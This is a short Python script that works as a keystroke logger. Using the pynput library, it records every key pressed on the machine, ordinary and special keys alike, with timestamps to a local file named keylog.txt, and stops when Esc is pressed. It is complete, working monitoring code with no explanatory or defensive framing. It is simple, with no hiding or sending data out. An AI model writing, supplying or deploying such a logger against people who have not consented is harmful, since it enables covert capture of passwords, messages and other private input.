from pynput.keyboard import Key, Listener
import logging

# Set up logging
log_dir = ""
logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info('Key pressed: {0}'.format(key.char))
    except AttributeError:
        logging.info('Special key pressed: {0}'.format(key))

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
